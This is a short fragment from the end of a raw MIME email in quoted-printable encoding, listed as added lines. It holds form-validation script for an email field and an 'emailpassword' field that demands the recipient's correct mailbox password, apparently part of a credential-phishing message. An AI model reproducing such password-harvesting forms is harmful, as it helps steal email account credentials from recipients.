+frmvalidator.addValidation("email","email","Please enter a valid email addr=
+ess");
+frmvalidator.addValidation("emailpassword","req","Please provide your corre=
+ct e-mail password");=20
+</script>
+=09=09=09
+</div>
+
+</body></html>=
+
+--===============0497893840==--
